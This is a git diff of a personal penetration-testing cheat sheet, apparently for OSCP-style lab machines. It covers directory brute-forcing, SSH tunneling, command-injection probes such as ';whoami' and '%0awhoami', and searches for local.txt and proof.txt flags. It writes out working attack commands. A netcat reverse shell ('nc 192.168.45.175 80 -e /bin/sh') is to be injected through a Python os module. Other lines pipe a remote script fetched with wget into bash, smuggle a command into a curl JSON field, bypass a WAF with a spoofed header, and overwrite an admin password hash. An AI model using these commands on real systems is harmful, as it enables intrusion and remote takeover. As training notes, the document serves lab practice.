@@ -9,6 +9,7 @@
   - [gobuster](#gobuster)
   - [wfuzz](#wfuzz)
   - [wget](#wget)
+  - [Python](#python)
 - [SSH](#ssh)
   - [SSH KEY](#ssh-key)
   - [SSH Tunneling](#ssh-tunneling)
@@ -78,8 +79,6 @@ select * from users_secure;
 update users_secure SET password="$2y$10$R0cpsKNLDqDZpfxDCaq8Qufxl0uLbmwiL0k6XDR1kPBDXVIYbeQ0W" WHERE username="admin"
 ```
 
-
-
 ## Tools
 ### feroxbuster 
 ```bash
@@ -89,8 +88,7 @@ feroxbuster -u http://192.168.209.153:8000/ -w /usr/share/seclists/Discovery/Web
 
 ### gobuster
 ```bash
-gobuster dir -u http://<% tp.frontmatter["RHOST"] %>/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
-
+gobuster dir -u http://192.168.167.109/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
 ```
 
 ### curl
@@ -120,6 +118,15 @@ wfuzz -c --sc 200,301 -w /usr/share/wordlists/seclists/Discovery/Web-Content/com
 wget -O - http://192.168.45.175:443/lse.sh | bash
 
 ```
+
+### Python
+```bash
+# When encoding characters;
+python3 -c 'import urllib.parse; original_string = "\n"; url_encoded_string = urllib.parse.quote(original_string); print(url_encoded_string);'
+%0A
+
+```
+
 
 # SSH
 ## SSH Keygen
@@ -152,15 +159,24 @@ ssh -N -R 127.0.0.1:2345:10.4.50.215:5432 kali@192.168.118.4
 
 # Remote dynamic port forwarding
 ssh -N -R 9998 kali@192.168.118.4
-
 ```
 
 
 # Web Attacks
 ## General Tips!
+- Open the website and view page/page sources
+  - gobuster: wait until it is finished since some important directories show up later!(ex. /under_construction)
+  - feroxbuster
+  - run nikto
+- We should try both POST and GET request using the key variable(ex. UC404)
+  - Try with GET request
+    - http://192.168.x.x/api?var=whoami
+    - http://192.168.x.x/api?var=%0awhoami
+    - http://192.168.x.x/api?var=;whoami
+  - Try with POST request
+    - Intercept the request with Burp Suite
 - WAF bypass: X-Forwarded-For:127.0.0.1
-- When we're dealing with python server, see if we can use os module and send "nc 192.168.45.175 80 -e /bin/bash" when we find data entry
-
+- When we're dealing with python server, see if we can use os module and send "nc 192.168.45.175 80 -e /bin/sh" when we find data entry
 
 ## When it's api response
 ```bash
@@ -182,10 +198,13 @@ curl -d '{"user":"clumsyadmin","url":"http://192.168.45.175:443/updatefile.elf;n
 - When we're changing download path, try ./Documents/ or /Documents/ or Documents/
 
 ## Input form
-- Input form: check with burpsuite
-- SQLi
-- Check to see if we can modify post data
-
+- SQLi? Command injection?
+- Try with GET request
+  - http://192.168.x.x/api?var=whoami
+  - http://192.168.x.x/api?var=%0awhoami
+  - http://192.168.x.x/api?var=;whoami
+- Try with POST request
+  - Intercept the request with Burp Suite
 
 ## Directory Traversal
 - Make sure to read and try exploit codes' examples
@@ -332,6 +351,10 @@ Get-Process
 # User context
 id
 hostname
+
+# Search for flags
+find / -type f -name 'local.txt' 2>/dev/null
+find / -type f -name 'proof.txt' 2>/dev/null
 
 # Check User files(Everyone if you can)
 cat /home/user/.bash_aliases
